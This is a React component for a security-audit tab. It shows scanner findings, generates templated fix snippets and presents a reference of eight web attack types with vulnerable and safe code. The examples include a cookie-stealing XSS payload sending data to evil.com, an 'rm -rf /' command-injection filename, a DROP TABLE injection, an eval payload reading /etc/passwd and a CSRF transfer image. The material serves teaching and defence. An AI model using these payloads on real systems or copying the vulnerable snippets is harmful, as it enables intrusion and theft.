import { useState } from 'react';
import {
  Shield,
  AlertTriangle,
  FileCode,
  ArrowRight,
  Wand2,
  Check,
  Copy,
  Download,
  Lock,
  CheckCircle2,
  Bug,
  Zap,
  Database,
  Eye,
  Key,
  Globe,
  Server,
  ShieldAlert,
  ShieldCheck,
  ChevronDown,
  ChevronRight,
} from 'lucide-react';
import { SecurityFinding } from '../../types';
import { EmptyState } from '../common/EmptyState';

interface SecurityTabProps {
  findings: SecurityFinding[];
  onOpenFile: (path: string) => void;
}

// ─────────────────────────────────────────────────────────────────────────────
// Attack Surface Matrix — static knowledge base
// ─────────────────────────────────────────────────────────────────────────────
interface AttackVector {
  id: string;
  name: string;
  icon: React.ElementType;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  howItWorks: string;
  weaknesses: string[];
  solutions: string[];
  codeExample: { vulnerable: string; safe: string };
  detectionHint: string;
}

const ATTACK_VECTORS: AttackVector[] = [
  {
    id: 'sql-injection',
    name: 'SQL Injection',
    icon: Database,
    severity: 'critical',
    description: 'Attacker injects malicious SQL through input fields to manipulate or read the database.',
    howItWorks: "A user submits `' OR 1=1; DROP TABLE users; --` as a username. If the query is built by string concatenation, it executes the injected SQL directly against the database.",
    weaknesses: [
      'String concatenation to build SQL queries',
      'Missing input sanitization on form fields',
      'No parameterized queries or prepared statements',
      'Over-privileged database user accounts',
    ],
    solutions: [
      'Always use parameterized queries (e.g., `$1`, `?`, `:name`)',
      'Use an ORM like Prisma, Drizzle, or Sequelize',
      'Apply the principle of least privilege on DB users',
      'Validate and whitelist all user input types',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\nconst query = "SELECT * FROM users WHERE name = '" + req.body.name + "'";\ndb.query(query);`,
      safe: `// ✅ SAFE\nconst query = "SELECT * FROM users WHERE name = $1";\ndb.query(query, [req.body.name]);`,
    },
    detectionHint: 'Look for string concatenation in SQL statements near req.body, req.query, or user input variables.',
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: Globe,
    severity: 'high',
    description: 'Attacker injects malicious scripts into web pages viewed by other users to steal data or hijack sessions.',
    howItWorks: "A comment field accepts `<script>fetch('https://evil.com?c='+document.cookie)</script>`. When another user views the page, their session cookie is sent to the attacker.",
    weaknesses: [
      'Using `.innerHTML` or `dangerouslySetInnerHTML` with user input',
      'Rendering unsanitized user-generated content',
      'Missing Content-Security-Policy (CSP) headers',
      'No output encoding when displaying user data',
    ],
    solutions: [
      'Use `textContent` instead of `innerHTML` for plain text',
      'Sanitize HTML with DOMPurify before rendering',
      'Set strict Content-Security-Policy headers',
      'Enable HttpOnly and Secure flags on cookies',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\ndiv.innerHTML = userComment;`,
      safe: `// ✅ SAFE\nimport DOMPurify from 'dompurify';\ndiv.innerHTML = DOMPurify.sanitize(userComment);`,
    },
    detectionHint: 'Search for `.innerHTML =`, `dangerouslySetInnerHTML`, `document.write(`, or `v-html` in component files.',
  },
  {
    id: 'command-injection',
    name: 'Command Injection',
    icon: Server,
    severity: 'critical',
    description: 'Attacker injects shell commands through application inputs that are passed to an OS shell.',
    howItWorks: "An API receives a filename like `file.txt; rm -rf /`. If the server runs `exec('cat ' + filename)`, the injected `;` separates and executes the second destructive command.",
    weaknesses: [
      'Passing user input directly to exec(), system(), or Popen()',
      'Using shell: true in child_process options',
      'Constructing shell commands by string concatenation',
      'Missing input validation on file paths and parameters',
    ],
    solutions: [
      'Use `execFile()` or `spawn()` with argument arrays instead of exec()',
      'Never pass user input to shell commands',
      'Whitelist allowed values and reject anything else',
      'Run server processes with minimal OS permissions',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\nexec('convert ' + req.query.file + ' output.pdf');`,
      safe: `// ✅ SAFE\nconst file = path.basename(req.query.file); // sanitize\nexecFile('convert', [file, 'output.pdf']);`,
    },
    detectionHint: 'Search for `exec(`, `execSync(`, `os.system(`, `subprocess.Popen(shell=True` with user-controlled variables.',
  },
  {
    id: 'broken-auth',
    name: 'Broken Authentication',
    icon: Key,
    severity: 'critical',
    description: 'Weak or incorrectly implemented authentication allows attackers to impersonate users or take over accounts.',
    howItWorks: "If JWT tokens are signed with a weak secret or verified without checking the `alg` field, an attacker can forge tokens by setting `alg: none` and signing their own payload with any user ID.",
    weaknesses: [
      'Weak or hardcoded JWT secrets',
      'No token expiry or rotation policy',
      'Missing brute-force protection on login endpoints',
      'Passwords stored in plaintext or using weak hashing (MD5)',
      'Session IDs not regenerated after login',
    ],
    solutions: [
      'Use strong, randomly generated secrets (32+ bytes) from environment variables',
      'Set short JWT expiry (15–60 min) with refresh token rotation',
      'Hash passwords with bcrypt, argon2, or scrypt',
      'Implement rate limiting and account lockout on auth endpoints',
      'Always verify the `alg` field in JWT header',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\nconst token = jwt.sign(payload, 'secret123'); // weak secret`,
      safe: `// ✅ SAFE\nconst token = jwt.sign(payload, process.env.JWT_SECRET, {\n  expiresIn: '15m',\n  algorithm: 'HS256'\n});`,
    },
    detectionHint: 'Search for hardcoded strings in jwt.sign(), bcrypt calls, session configuration, and login rate-limit middleware.',
  },
  {
    id: 'sensitive-data',
    name: 'Sensitive Data Exposure',
    icon: Eye,
    severity: 'high',
    description: 'API responses or logs leak passwords, tokens, PII, or internal system data to unauthorized parties.',
    howItWorks: "An error handler logs the full request object: `console.log(req)`. If `req.body` contains a password or token, it gets written to log files that may be accessible to attackers.",
    weaknesses: [
      'Logging full request/response objects including sensitive fields',
      'API responses returning password hashes or tokens',
      'Missing field-level access control on database queries',
      'Sensitive data in browser localStorage without encryption',
      'HTTP used instead of HTTPS for data transmission',
    ],
    solutions: [
      'Strip sensitive fields (password, token, secret) before logging',
      'Use field-level serializers to control API response shape',
      'Encrypt sensitive data at rest and in transit (HTTPS only)',
      'Use HttpOnly cookies for tokens instead of localStorage',
      'Apply row-level security or authorization checks on queries',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\nres.json(await db.findUser(id)); // returns password hash!`,
      safe: `// ✅ SAFE\nconst { password, ...safeUser } = await db.findUser(id);\nres.json(safeUser);`,
    },
    detectionHint: 'Check API route handlers for `res.json(user)` or `console.log(req.body)` without field filtering.',
  },
  {
    id: 'code-execution',
    name: 'Arbitrary Code Execution (eval)',
    icon: Bug,
    severity: 'critical',
    description: 'Using `eval()` or `Function()` on user-controlled input executes attacker code in the application context.',
    howItWorks: "An API receives a formula string and evaluates it: `eval(req.body.formula)`. An attacker submits `process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')` to read server files.",
    weaknesses: [
      'Using eval() with any user-provided string',
      'Using the Function() constructor with user input',
      'Template engines with unescaped eval-equivalent features',
      'Server-side rendering of user-supplied scripts',
    ],
    solutions: [
      'Never use eval() on untrusted input — use JSON.parse() for data',
      'Use a sandboxed expression evaluator (e.g., `math.js`, `expr-eval`)',
      'Use template literals with explicit escaping',
      'Validate and whitelist allowed formula operators/functions',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE\nconst result = eval(req.body.formula);`,
      safe: `// ✅ SAFE\nimport { evaluate } from 'mathjs'; // sandboxed evaluator\nconst result = evaluate(sanitizeFormula(req.body.formula));`,
    },
    detectionHint: 'Search for `eval(`, `new Function(`, `setTimeout(string,` with variables from user input.',
  },
  {
    id: 'insecure-deps',
    name: 'Vulnerable Dependencies',
    icon: Zap,
    severity: 'high',
    description: 'Outdated or compromised third-party packages introduce known CVEs into the application.',
    howItWorks: "An application uses `lodash@4.17.4`, which has a known prototype pollution vulnerability (CVE-2019-10744). An attacker calls a lodash method with `{\"__proto__\":{\"isAdmin\":true}}` to escalate privileges.",
    weaknesses: [
      'Unpinned or outdated dependency versions',
      'No automated dependency auditing in CI/CD',
      'Using abandoned or unmaintained packages',
      'Lock files not committed to version control',
    ],
    solutions: [
      'Run `npm audit` or `pip-audit` regularly and in CI',
      'Pin dependency versions in package.json / requirements.txt',
      'Enable Dependabot or Renovate for automated updates',
      'Review package download counts and maintenance status before adding',
    ],
    codeExample: {
      vulnerable: `// ❌ RISKY — unpinned versions\n"dependencies": {\n  "lodash": "^4.17.0" // accepts any 4.x including vulnerable\n}`,
      safe: `// ✅ SAFER — pinned with audit\n"dependencies": {\n  "lodash": "4.17.21" // specific safe version\n}\n// + run: npm audit fix`,
    },
    detectionHint: 'Check package.json for `^` or `~` version ranges on security-critical packages. Run `npm audit` to find CVEs.',
  },
  {
    id: 'csrf',
    name: 'Cross-Site Request Forgery (CSRF)',
    icon: ShieldAlert,
    severity: 'medium',
    description: 'Attacker tricks an authenticated user into unknowingly submitting a malicious request from another site.',
    howItWorks: "A user is logged in to bank.com. An attacker hosts evil.com with `<img src=\"https://bank.com/transfer?to=attacker&amount=10000\">`. When the user visits evil.com, their browser sends the authenticated request.",
    weaknesses: [
      'State-changing endpoints accepting GET requests',
      'Missing CSRF token validation on POST/PUT/DELETE',
      'Overly permissive CORS configuration',
      'SameSite=None cookies without Secure flag',
    ],
    solutions: [
      'Implement CSRF tokens (e.g., `csurf` middleware for Express)',
      'Set `SameSite=Strict` or `SameSite=Lax` on session cookies',
      'Validate the `Origin` and `Referer` headers on state-changing requests',
      'Use `Authorization: Bearer` tokens (not cookies) for APIs',
    ],
    codeExample: {
      vulnerable: `// ❌ VULNERABLE — no CSRF protection\napp.post('/transfer', (req, res) => { ... });`,
      safe: `// ✅ SAFE — CSRF token required\nimport csrf from 'csurf';\napp.post('/transfer', csrf(), (req, res) => { ... });`,
    },
    detectionHint: "Check that state-changing routes verify CSRF tokens and that cookie configuration includes `SameSite=Strict`.",
  },
];

const severityColors: Record<string, string> = {
  critical: 'bg-zinc-900 text-white',
  high: 'bg-zinc-700 text-white',
  medium: 'bg-zinc-400 text-zinc-900',
  low: 'bg-zinc-200 text-zinc-700',
};

export function SecurityTab({ findings, onOpenFile }: SecurityTabProps) {
  const [activeView, setActiveView] = useState<'findings' | 'attack-surface'>('findings');
  const [selectedSeverity, setSelectedSeverity] = useState<'all' | 'critical' | 'high' | 'medium' | 'low'>('all');
  const [generatedPatches, setGeneratedPatches] = useState<Record<string, { original: string; patched: string }>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [expandedVector, setExpandedVector] = useState<string | null>(null);

  const filtered = findings.filter(
    (f) => selectedSeverity === 'all' || f.severity === selectedSeverity
  );

  const criticalCount = findings.filter((f) => f.severity === 'critical').length;
  const highCount = findings.filter((f) => f.severity === 'high').length;
  const mediumCount = findings.filter((f) => f.severity === 'medium').length;

  const handleGeneratePatch = (item: SecurityFinding) => {
    let patched = item.evidence;

    if (item.evidence.includes('eval(')) {
      patched = `// SAFE FIX: Avoid eval — use a sandboxed parser\nimport { evaluate } from 'mathjs';\nconst result = evaluate(sanitizeInput(${item.evidence.replace(/eval\((.*)?\)/, '$1')}));`;
    } else if (item.evidence.includes('dangerouslySetInnerHTML')) {
      patched = `// SAFE FIX: Sanitize HTML with DOMPurify\nimport DOMPurify from 'dompurify';\n<div>{DOMPurify.sanitize(${item.evidence.match(/__html:\s*([^}]+)/)?.[1] || 'content'})}</div>`;
    } else if (item.evidence.includes('exec(') || item.evidence.includes('spawn(')) {
      patched = `// SAFE FIX: Use execFile with argument arrays — no shell invocation\nimport { execFile } from 'child_process';\nexecFile('command', ['--arg1', sanitizedInput], (error, stdout) => {\n  if (error) throw error;\n  return stdout;\n});`;
    } else if (item.evidence.includes('innerHTML')) {
      patched = `// SAFE FIX: Use textContent for plain text, DOMPurify for HTML\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userInput);\n// OR for plain text:\nelement.textContent = userInput;`;
    } else if (item.evidence.includes('http://')) {
      patched = item.evidence.replace(/http:\/\//g, 'https://');
    } else if (/SELECT|INSERT|UPDATE|DELETE/i.test(item.evidence)) {
      patched = `// SAFE FIX: Use parameterized query\nconst result = await db.query(\n  'SELECT * FROM table WHERE id = $1',\n  [userInput] // parameterized — SQL injection safe\n);`;
    } else if (/password|secret|api_key/i.test(item.evidence)) {
      patched = `// SAFE FIX: Load secrets from environment variables\nconst secret = process.env.SECRET_KEY;\nif (!secret) throw new Error('SECRET_KEY not configured');\n// Remove the hardcoded value from source code!`;
    } else {
      patched = `// SAFE FIX: Validate and sanitize input before processing\nfunction sanitize(input: string): string {\n  if (typeof input !== 'string') throw new TypeError('Expected string');\n  return input.replace(/[<>\"']/g, '').slice(0, 500);\n}\n// Then use: sanitize(${item.evidence.slice(0, 40)}...)`;
    }

    setGeneratedPatches((prev) => ({ ...prev, [item.id]: { original: item.evidence, patched } }));
  };

  const handleCopyPatch = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleDownloadAllPatches = () => {
    const patchContent = findings
      .map((f) => {
        const patch = generatedPatches[f.id]?.patched || f.suggestedAction;
        return `--- a/${f.file}\n+++ b/${f.file}\n@@ -${f.line},1 +${f.line},1 @@\n# Fix for: ${f.title} (${f.severity.toUpperCase()})\n- ${f.evidence}\n+ ${patch}\n`;
      })
      .join('\n');

    const blob = new Blob([patchContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `security-audit-patches.patch`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="h-full flex flex-col bg-white overflow-hidden font-sans select-none">
      {/* Header */}
      <div className="flex flex-wrap items-center justify-between gap-4 px-6 py-4 bg-white border-b border-zinc-200 shrink-0">
        <div className="flex items-center gap-3">
          <Shield className="w-5 h-5 text-zinc-900" />
          <h2 className="text-base font-bold text-zinc-900">Security Audit & Defense</h2>
          <span className="text-xs font-mono font-bold px-2.5 py-0.5 rounded-md bg-zinc-900 text-white">
            {findings.length} findings
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={handleDownloadAllPatches}
            className="flex items-center gap-1.5 px-3.5 py-1.5 bg-zinc-900 hover:bg-black text-white rounded-xl text-xs font-bold shadow-xs cursor-pointer transition-colors"
            title="Download Security Patch File (.patch)"
          >
            <Download className="w-3.5 h-3.5" />
            <span className="hidden md:inline">Download .patch</span>
          </button>
        </div>
      </div>

      {/* View Toggle */}
      <div className="flex items-center gap-0 px-6 pt-4 pb-0 border-b border-zinc-200 shrink-0">
        <button
          onClick={() => setActiveView('findings')}
          className={`px-4 py-2 text-xs font-bold border-b-2 transition-all cursor-pointer ${
            activeView === 'findings'
              ? 'border-zinc-900 text-zinc-900'
              : 'border-transparent text-zinc-400 hover:text-zinc-700'
          }`}
        >
          <span className="flex items-center gap-1.5">
            <AlertTriangle className="w-3.5 h-3.5" />
            Scan Findings ({findings.length})
          </span>
        </button>
        <button
          onClick={() => setActiveView('attack-surface')}
          className={`px-4 py-2 text-xs font-bold border-b-2 transition-all cursor-pointer ${
            activeView === 'attack-surface'
              ? 'border-zinc-900 text-zinc-900'
              : 'border-transparent text-zinc-400 hover:text-zinc-700'
          }`}
        >
          <span className="flex items-center gap-1.5">
            <ShieldAlert className="w-3.5 h-3.5" />
            Attack Surface & Solutions
          </span>
        </button>
      </div>

      {/* ── FINDINGS VIEW ──────────────────────────────────────────────────── */}
      {activeView === 'findings' && (
        <div className="flex-1 overflow-auto">
          {findings.length === 0 ? (
            <div className="h-full flex items-center justify-center">
              <div className="text-center py-16">
                <ShieldCheck className="w-12 h-12 text-zinc-300 mx-auto mb-3" />
                <p className="text-sm font-semibold text-zinc-500">No Security Vulnerabilities Detected</p>
                <p className="text-xs text-zinc-400 mt-1">All inspected source files passed static analysis checks.</p>
              </div>
            </div>
          ) : (
            <div className="p-6 bg-zinc-50/50">
              {/* Severity Filter */}
              <div className="flex flex-wrap items-center gap-1.5 mb-4 text-xs font-mono">
                {(['all', 'critical', 'high', 'medium', 'low'] as const).map((sev) => {
                  const count = sev === 'all' ? findings.length : findings.filter((f) => f.severity === sev).length;
                  if (count === 0 && sev !== 'all') return null;
                  return (
                    <button
                      key={sev}
                      onClick={() => setSelectedSeverity(sev)}
                      className={`px-3 py-1 rounded-xl transition-all cursor-pointer font-bold capitalize ${
                        selectedSeverity === sev
                          ? 'bg-zinc-900 text-white shadow-xs'
                          : 'text-zinc-700 hover:bg-zinc-100 bg-white border border-zinc-300'
                      }`}
                    >
                      {sev === 'all' ? `All (${count})` : `${sev} (${count})`}
                    </button>
                  );
                })}
              </div>

              <div className="max-w-5xl mx-auto space-y-4">
                <div className="p-4 bg-zinc-100 border border-zinc-300 rounded-2xl text-xs text-zinc-800 font-semibold flex items-center gap-2">
                  <Lock className="w-4 h-4 text-zinc-900 shrink-0" />
                  <span>Static analysis detects insecure code patterns. Click "Generate AI Patch" to get a safe replacement. Switch to "Attack Surface" tab to learn how each vulnerability can be exploited.</span>
                </div>

                {filtered.map((item) => {
                  const patch = generatedPatches[item.id];
                  return (
                    <div
                      key={item.id}
                      className="p-6 bg-white border border-zinc-300 rounded-2xl shadow-xs space-y-4 hover:border-zinc-400 transition-all"
                    >
                      {/* Header */}
                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                        <div className="flex items-center gap-2 min-w-0">
                          <AlertTriangle className="w-5 h-5 text-zinc-900 shrink-0" />
                          <span className="text-base font-bold text-zinc-900 truncate">{item.title}</span>
                          <span className={`text-[10px] font-mono px-2 py-0.5 rounded-md border uppercase font-bold ${severityColors[item.severity]} border-transparent`}>
                            {item.severity}
                          </span>
                        </div>

                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => handleGeneratePatch(item)}
                            className="flex items-center gap-1.5 px-3.5 py-1.5 bg-zinc-900 hover:bg-black text-white rounded-xl text-xs font-bold shadow-xs transition-all cursor-pointer"
                          >
                            <Wand2 className="w-3.5 h-3.5 text-white" />
                            <span>Generate AI Patch</span>
                          </button>

                          <button
                            onClick={() => onOpenFile(item.file)}
                            className="flex items-center gap-1.5 px-3 py-1.5 bg-zinc-100 hover:bg-zinc-200 border border-zinc-300 rounded-xl text-xs font-mono text-zinc-900 font-bold transition-colors shrink-0 cursor-pointer"
                          >
                            <FileCode className="w-3.5 h-3.5 text-zinc-700" />
                            <span>{item.file}:{item.line}</span>
                            <ArrowRight className="w-3 h-3 text-zinc-900" />
                          </button>
                        </div>
                      </div>

                      {/* Evidence */}
                      <div className="p-3.5 bg-zinc-50 border border-zinc-300 rounded-xl font-mono text-xs text-zinc-900 overflow-x-auto">
                        <span className="text-zinc-400 select-none mr-3">{item.line} |</span>
                        <code>{item.evidence}</code>
                      </div>

                      {/* AI Patch */}
                      {patch && (
                        <div className="p-4 bg-zinc-100 border border-zinc-300 rounded-xl space-y-2 animate-in fade-in">
                          <div className="flex items-center justify-between">
                            <span className="text-xs font-bold text-zinc-900 flex items-center gap-1.5">
                              <CheckCircle2 className="w-4 h-4 text-zinc-900" /> Suggested Security Fix:
                            </span>
                            <button
                              onClick={() => handleCopyPatch(item.id, patch.patched)}
                              className="flex items-center gap-1 px-3 py-1 bg-zinc-900 hover:bg-black text-white rounded-lg text-xs font-bold transition-colors cursor-pointer"
                            >
                              {copiedId === item.id ? (
                                <><Check className="w-3 h-3" /> Copied!</>
                              ) : (
                                <><Copy className="w-3 h-3" /> Copy Fix</>
                              )}
                            </button>
                          </div>
                          <pre className="p-3 bg-white border border-zinc-300 rounded-lg font-mono text-xs text-zinc-900 overflow-x-auto whitespace-pre-wrap">
                            {patch.patched}
                          </pre>
                        </div>
                      )}

                      {/* Explanation */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-1 text-xs">
                        <div>
                          <span className="font-bold text-zinc-500 uppercase tracking-wider block mb-1">Explanation</span>
                          <p className="text-zinc-700 leading-relaxed font-medium">{item.explanation}</p>
                        </div>
                        <div>
                          <span className="font-bold text-zinc-500 uppercase tracking-wider block mb-1">Recommended Action</span>
                          <p className="text-zinc-900 font-bold leading-relaxed">{item.suggestedAction}</p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          )}
        </div>
      )}

      {/* ── ATTACK SURFACE VIEW ────────────────────────────────────────────── */}
      {activeView === 'attack-surface' && (
        <div className="flex-1 overflow-auto p-6 bg-zinc-50/50">
          <div className="max-w-5xl mx-auto space-y-3">
            {/* Intro card */}
            <div className="p-4 bg-zinc-900 text-white rounded-2xl text-xs font-medium leading-relaxed flex items-start gap-3">
              <ShieldAlert className="w-5 h-5 shrink-0 mt-0.5" />
              <div>
                <p className="font-bold text-sm mb-1">Attack Surface Reference</p>
                <p className="text-zinc-300">Each card below shows a real attack vector, how it works, the weaknesses it exploits, and concrete code-level solutions. Use this as a checklist when reviewing your repository's security posture.</p>
              </div>
            </div>

            {/* Summary severity bar */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-2">
              {(['critical', 'high', 'medium', 'low'] as const).map((sev) => {
                const count = ATTACK_VECTORS.filter((v) => v.severity === sev).length;
                return (
                  <div key={sev} className="p-3 bg-white border border-zinc-200 rounded-xl text-center">
                    <div className={`inline-block text-[10px] font-mono font-bold px-2 py-0.5 rounded-md mb-1 capitalize ${severityColors[sev]}`}>{sev}</div>
                    <p className="text-lg font-black text-zinc-900">{count}</p>
                    <p className="text-[10px] text-zinc-400 font-mono">attack vectors</p>
                  </div>
                );
              })}
            </div>

            {/* Attack vector cards */}
            {ATTACK_VECTORS.map((vector) => {
              const Icon = vector.icon;
              const isExpanded = expandedVector === vector.id;

              return (
                <div
                  key={vector.id}
                  className="bg-white border border-zinc-200 rounded-2xl shadow-xs overflow-hidden hover:border-zinc-300 transition-all"
                >
                  {/* Card header — always visible */}
                  <button
                    className="w-full p-5 flex items-start gap-4 text-left cursor-pointer hover:bg-zinc-50/60 transition-colors"
                    onClick={() => setExpandedVector(isExpanded ? null : vector.id)}
                  >
                    <div className="p-2.5 bg-zinc-100 rounded-xl shrink-0">
                      <Icon className="w-5 h-5 text-zinc-900" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-sm font-bold text-zinc-900">{vector.name}</span>
                        <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded-md capitalize ${severityColors[vector.severity]}`}>
                          {vector.severity}
                        </span>
                      </div>
                      <p className="text-xs text-zinc-600 mt-1 leading-relaxed">{vector.description}</p>
                    </div>
                    <div className="shrink-0 text-zinc-400 mt-1">
                      {isExpanded ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                    </div>
                  </button>

                  {/* Expanded detail */}
                  {isExpanded && (
                    <div className="border-t border-zinc-100 p-5 space-y-5 bg-white animate-in fade-in duration-150">
                      {/* How it works */}
                      <div>
                        <h4 className="text-[10px] font-mono font-bold uppercase tracking-wider text-zinc-400 mb-2">How the Attack Works</h4>
                        <p className="text-xs text-zinc-700 leading-relaxed bg-zinc-50 border border-zinc-200 rounded-xl p-3">{vector.howItWorks}</p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        {/* Weaknesses */}
                        <div>
                          <h4 className="text-[10px] font-mono font-bold uppercase tracking-wider text-zinc-400 mb-2 flex items-center gap-1.5">
                            <AlertTriangle className="w-3 h-3" /> Weaknesses Exploited
                          </h4>
                          <ul className="space-y-1.5">
                            {vector.weaknesses.map((w, i) => (
                              <li key={i} className="flex gap-2 text-xs text-zinc-700">
                                <span className="w-4 h-4 rounded-full bg-zinc-100 border border-zinc-300 flex items-center justify-center text-[9px] font-bold shrink-0 mt-0.5">{i + 1}</span>
                                <span>{w}</span>
                              </li>
                            ))}
                          </ul>
                        </div>

                        {/* Solutions */}
                        <div>
                          <h4 className="text-[10px] font-mono font-bold uppercase tracking-wider text-zinc-400 mb-2 flex items-center gap-1.5">
                            <ShieldCheck className="w-3 h-3" /> Solutions & Defenses
                          </h4>
                          <ul className="space-y-1.5">
                            {vector.solutions.map((s, i) => (
                              <li key={i} className="flex gap-2 text-xs text-zinc-800 font-medium">
                                <CheckCircle2 className="w-3.5 h-3.5 text-zinc-500 shrink-0 mt-0.5" />
                                <span>{s}</span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      </div>

                      {/* Code example */}
                      <div>
                        <h4 className="text-[10px] font-mono font-bold uppercase tracking-wider text-zinc-400 mb-2">Code Example</h4>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                          <div>
                            <p className="text-[10px] font-mono text-zinc-500 mb-1">Before (Vulnerable)</p>
                            <pre className="p-3 bg-zinc-900 text-zinc-100 rounded-xl font-mono text-[11px] overflow-x-auto whitespace-pre-wrap leading-relaxed">
                              {vector.codeExample.vulnerable}
                            </pre>
                          </div>
                          <div>
                            <p className="text-[10px] font-mono text-zinc-500 mb-1">After (Safe)</p>
                            <pre className="p-3 bg-zinc-100 border border-zinc-300 text-zinc-900 rounded-xl font-mono text-[11px] overflow-x-auto whitespace-pre-wrap leading-relaxed">
                              {vector.codeExample.safe}
                            </pre>
                          </div>
                        </div>
                      </div>

                      {/* Detection hint */}
                      <div className="flex items-start gap-2 p-3 bg-zinc-50 border border-zinc-200 rounded-xl text-xs">
                        <Eye className="w-3.5 h-3.5 text-zinc-500 shrink-0 mt-0.5" />
                        <div>
                          <span className="font-bold text-zinc-700">How to detect in your code: </span>
                          <span className="text-zinc-600">{vector.detectionHint}</span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}
